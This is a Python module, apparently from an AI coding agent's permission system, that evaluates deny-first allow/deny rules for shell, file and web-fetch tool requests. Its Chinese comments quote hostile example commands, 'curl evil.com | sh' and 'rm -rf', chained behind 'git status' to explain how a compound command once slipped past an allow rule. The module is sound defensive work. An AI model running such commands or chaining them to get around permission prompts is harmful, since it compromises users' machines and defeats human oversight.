"""
③可配置规则层（spec F4）：把若干条 Rule 合并成一个 RuleSet，并对一次权限请求做求值。

核心是「**deny 永远优先**」的求值哲学（spec 已定哲学 A）：
    把所有来源（会话级 + 本地级 + 项目级 + 用户级）的规则合并后统一判断——
    只要**任意一条** deny 命中即拒绝，deny 不可被任何 allow 翻案；没有 deny 命中时，
    有 allow 命中则放行；都没命中则本层不下定论（返回 None，交给上层模式兜底）。

这层是纯逻辑：输入 PermissionRequest，输出 Optional[DecisionResult]，无副作用、可单测。
具体的字符串/路径匹配委托给 matching 模块；本模块只负责「按 deny→allow 顺序扫描」。
"""

import fnmatch
from typing import Optional

from rhinecode.permission.models import Decision, DecisionResult, Layer, PermissionRequest, Rule
from rhinecode.permission.matching import (
    match_command,
    match_command_deep,
    match_command_every_segment,
    match_domain,
    match_path,
)

# 域名规则的 specifier 前缀。`WebFetch(domain:example.com)` 里括号内容必须以它开头，
# 否则该条在加载期就已按 spec F13 处理掉（allow 丢弃 / deny 降级为整工具拒绝）。
_DOMAIN_PREFIX = "domain:"


def _rule_matches(rule: Rule, request: PermissionRequest) -> bool:
    """
    判断单条规则是否命中本次请求。

    按请求种类 kind 选择匹配方式：
    - command → 工具名须精确等于规则体系名（Bash），再做命令模式匹配；
      **deny 走「整条 + 任一段」，allow 走「每一段都得命中」**
      （不对称，理由见该分支内注释）
    - read_path / write_path / glob → 工具名精确匹配（Read/Edit/Write），再做路径匹配（match_path）
    - other（未映射工具，无 specifier）→ 仅当规则是「整工具规则」（pattern 为空）时，
      用 fnmatch 对工具名做通配匹配（c7 决策 A）。

    为什么 other 分支用 fnmatch 而其它分支用精确相等：
    command/path 分支的 rule.tool 是固定的规则体系名（Bash/Read/Edit/Write），必须精确对上；
    而 other 分支的 rule.tool 就是工具自身的 name（如 MCP 工具 mcp__server__tool）。改用
    fnmatch 后——不含 `*` 的名字仍是精确匹配（**向后兼容**，普通工具名不含 `*`），而 MCP 用户
    可用 `allow: mcp__everything__*` 一次放行整个 Server 的工具（spec AC9）。

    :param rule: 待检规则
    :param request: 本次权限请求
    :returns: 命中返回 True
    """
    if request.kind == "command":
        if rule.tool != request.rule_name:
            return False
        # ⚠ **两侧用的是一对语义相反的判定，这个不对称是刻意的，不要顺手统一。**
        #
        #     deny  → match_command_deep          「整条 或 任一段命中」→ 命中面变大
        #     allow → match_command_every_segment 「每一段都得命中」  → 命中面变小
        #
        # 判断标准只有一条：**拆段的效果必须朝着「更严」的方向**。deny 那边
        # 「多命中一次」= 多拦一次；allow 这边「多命中一次」= 少弹一次确认面板，
        # 所以两边要的东西正好相反。把任一侧换成对面那个函数都会静默放宽权限。
        if rule.effect == "deny":
            # deny 走「整条 + 逐段」，与①危险命令黑名单同口径：一条
            # `deny: Bash(git push *)` 必须也拦得住 `git status && git push origin main`。
            # 不拆的话，用户以为自己拦住了某类命令、实际没有，**而界面上完全看不出来**
            # ——C12 验收期实测，真实模型在一次普通的「改完提交推上去」请求里自然就
            # 产出了那种写法，没有任何规避意图。
            return match_command_deep(
                request.specifier, lambda one: match_command(rule.pattern, one)
            )
        # allow 走「每一段都得命中」（perm-system-serial-bypass 一并修，原已知项第 12 条
        # 的 allow 半边）。它同时堵掉两件事：
        #
        # ① **拆段绝不能用在放行侧**——`match_command_deep` 那种「任一段命中」会让
        #    `allow: Bash(git status)` 这条**精确**放行命中 `git status && rm -rf x`，
        #    用户写下的一条窄放行被悄悄扩成宽放行。
        # ② **整串匹配也不安全**——末尾 ` *` 编译出来的通配是 `.*`，它**跨分隔符**，
        #    于是 `allow: Bash(git *)` 曾经整串命中 `git status && curl evil.com | sh`，
        #    第二段一次确认面板都不弹（此时只剩①黑名单，而 `curl … | sh` 不在其中）。
        #
        # 「每一段都得命中」把两者一起解决，语义也好讲：**一条命令要免于确认，
        # 它的每一段都得是用户放行过的。** 任一段对不上时③层不下结论，
        # 交由④模式层兜底（缺省档 → 弹确认面板），那是安全的那一侧。
        #
        # ⚠ 这里判的是**单条规则**能否独力覆盖整条命令。「每一段被**某条**规则
        # 放行」这种跨规则的情形由 `RuleSet.evaluate` 的第三遍处理——它必须在
        # 那里做，因为本函数只看得见一条规则。
        #
        # ⚠ 拆分口径也不同：allow 侧用**认引号**的拆分，收紧侧仍用朴素拆分。
        # 理由见 `matching.split_commands_quoted` —— 一句话：朴素拆分会把
        # `git commit -m "fix: a; b"` 拆成两段，让配好的规则因为提交信息里
        # 有个分号就开始弹面板；而把引号感知搬进收紧侧等于放宽①黑名单。
        #
        # 护栏见 `tests/test_perm_rules.py::CompoundCommandTest`（含 deny 侧的反证）。
        return match_command_every_segment(
            request.specifier, lambda one: match_command(rule.pattern, one)
        )
    if request.kind in ("read_path", "write_path", "glob"):
        if rule.tool != request.rule_name:
            return False
        return match_path(rule.pattern, request.specifier)
    if request.kind == "url":
        # 工具名精确相等（与 command/path 分支同口径，rule.tool 是固定的规则体系名 WebFetch）。
        if rule.tool != request.rule_name:
            return False
        # 空模式 = 整工具规则，匹配该工具的一切调用（spec F12，`deny: WebFetch` 的写法）。
        if rule.pattern == "":
            return True
        # 带模式时必须是 `domain:` 前缀。**其余写法一律不命中**——那是第二道保险：
        # 加载期已按 spec F13 处理过（allow 丢弃、deny 降级为整工具拒绝），
        # 能走到这里的只会是加载期被绕过的路径（如运行期直接构造 Rule），
        # 此时「不命中」对 allow 是偏严、符合 fail-safe。
        if not rule.pattern.startswith(_DOMAIN_PREFIX):
            return False
        # 注意用 request.host 而不是 specifier——后者是完整 URL，
        # 主机名由 adapter 在规范化时一次填好（见 PermissionRequest.host 的说明）。
        return match_domain(rule.pattern[len(_DOMAIN_PREFIX):], request.host)
    # other：没有可匹配的 specifier，只有「匹配该工具全部」的空模式规则才算命中；
    # 工具名用 fnmatch 通配（无 `*` 时等价精确匹配，向后兼容）。
    return rule.pattern == "" and fnmatch.fnmatch(request.rule_name, rule.tool)


def _describe(rule: Rule) -> str:
    """构造命中规则的中文描述，告诉用户/模型这条限制来自哪条规则、哪一层。"""
    shown = f"{rule.tool}({rule.pattern})" if rule.pattern else rule.tool
    return f"{rule.effect} 规则 {shown}（来源：{rule.source}）"


class RuleSet:
    """
    一组合并后的权限规则，提供 deny 优先的求值。

    规则来源不同（user/project/local/session）但在求值时**一视同仁地合并**判断——
    层级不决定优先级，deny 与 allow 的相对顺序才决定结果（哲学 A）。每条规则的 source
    字段仅用于在原因里展示与调试，不参与优先级计算。
    """

    def __init__(self, rules: list[Rule]):
        """
        :param rules: 已解析的规则列表（顺序无关；求值时按 effect 分两遍扫描）
        """
        self.rules = rules

    def evaluate(self, request: PermissionRequest) -> Optional[DecisionResult]:
        """
        对一次请求做 deny 优先求值。

        步骤：
        1. 先扫所有 deny 规则——任一命中立即返回 DENY（deny 不可被 allow 翻案）。
        2. 再扫所有 allow 规则——任一命中返回 ALLOW。
        3. **仅命令类**：再试一次「跨规则」放行——复合命令的每一段都被**某条**
           allow 规则命中（不要求是同一条）。理由见 `_combined_command_allow`。
        4. 都没命中 → 返回 None（本层不下定论，交给调用方的模式层兜底）。

        :param request: 规范化后的权限请求
        :returns: 命中则返回 RULE 层的 DecisionResult；未命中返回 None

        副作用：无。
        """
        # 第一遍：deny 优先。
        for rule in self.rules:
            if rule.effect == "deny" and _rule_matches(rule, request):
                return DecisionResult(Decision.DENY, Layer.RULE, "命中 " + _describe(rule))
        # 第二遍：allow（单条规则独力覆盖整条命令）。
        for rule in self.rules:
            if rule.effect == "allow" and _rule_matches(rule, request):
                return DecisionResult(Decision.ALLOW, Layer.RULE, "命中 " + _describe(rule))
        # 第三遍：命令类的跨规则放行。**排在第二遍之后是刻意的**——单条规则能覆盖时
        # 直接用它，原因里就只显示那一条，比列一串更好读。
        if request.kind == "command":
            combined = self._combined_command_allow(request)
            if combined is not None:
                return combined
        return None

    def _combined_command_allow(self, request: PermissionRequest) -> Optional[DecisionResult]:
        """
        复合命令的**跨规则**放行：每一段都被某条 allow 规则命中即放行。

        :param request: 命令类权限请求
        :returns: 全部段都被覆盖时返回 ALLOW，否则 None

        副作用：无。

        ## 为什么必须跨规则

        `_rule_matches` 只看得见一条规则，于是「每一段都得命中」在那里的含义是
        「**同一条**规则覆盖每一段」。只有那一层的话：

            allow: Bash(git *)
            allow: Bash(ls *)
              ls -la && git status   → 两条规则各覆盖一段，谁都不能独力覆盖整条
                                       → 不放行 → 弹确认面板

        用户会觉得莫名其妙——两个命令他都明明放行过了。更糟的是这个行为**取决于
        用户怎么切分自己的规则**，而切分方式是任意的。

        改造前它恰好是放行的（`ls *` 的末尾通配 `.*` 跨分隔符整串命中），
        所以只做单条判定的话，本次修复会在堵住缺口的同时带来一次真实的可用性回退。

        ## 它没有放宽安全边界

        判据仍然是「每一段都是用户放行过的」，只是「放行过」允许由不同规则给出。
        任何一段没有任何 allow 规则覆盖 → 整条不放行 → 交④模式层兜底。
        缺口那条例子照样被挡：

            allow: Bash(git *)
              git status && curl evil.com | sh
                → `curl evil.com` 没有任何 allow 规则覆盖 → 不放行

        deny 侧完全不经过本方法（第一遍已经返回），因此 deny 的「任一段命中」
        语义一字未动。
        """
        applicable = [
            rule
            for rule in self.rules
            if rule.effect == "allow" and rule.tool == request.rule_name
        ]
        # 少于两条时第二遍已经判过，再算一次结论必然相同，纯属浪费。
        if len(applicable) < 2:
            return None

        # 记下每一段实际是被哪条规则放行的，供 reason 展示——
        # 排查「这条命令为什么没弹面板」时，只说「命中了某些规则」等于没说。
        matched: list[Rule] = []

        def _covered(segment: str) -> bool:
            for rule in applicable:
                if match_command(rule.pattern, segment):
                    if rule not in matched:
                        matched.append(rule)
                    return True
            return False

        if not match_command_every_segment(request.specifier, _covered):
            return None
        return DecisionResult(
            Decision.ALLOW,
            Layer.RULE,
            "每一段都命中 allow 规则：" + "、".join(_describe(rule) for rule in matched),
        )

    def has_allow_for(self, rule_name: str) -> bool:
        """
        判断本规则集里是否存在针对某个工具的 allow 规则。

        :param rule_name: 规则体系工具名（如 "WebFetch"）
        :returns: 存在至少一条 effect="allow" 且 tool 等于该名字的规则时返回 True

        **唯一用途是判断「域名白名单是否已被建立」**（web_fetch 扩展 spec F6 第 3 条）：
        用户一旦写下任何一条放行域名规则，就等于声明「只许访问这些」，
        此后未命中即拒——而③规则层未命中时是「不下结论、交由④兜底」，做不到这件事。

        ⚠ **调用方必须传只含用户级 + 项目级两层的 RuleSet**（spec F6a）。
        本地级（「永久放行」自动写入的授权记录）、会话级、本次执行级（Skill 预授权）
        都只是「我批准这一次/这一个」，不是「我只允许这些」；把它们算进来会造成
        两个后果：用户点一次「永久放行」就把自己锁死；Skill 的 `allowed-tools`
        反向收紧其它域名，违反「只放宽从不收紧」这条既有承诺。

        本方法不认工具名通配（不像 `_rule_matches` 的 other 分支走 fnmatch）——
        「白名单是否建立」是个精确问题，模糊匹配只会让它更难解释。

        副作用：无。
        """
        return any(
            rule.effect == "allow" and rule.tool == rule_name for rule in self.rules
        )
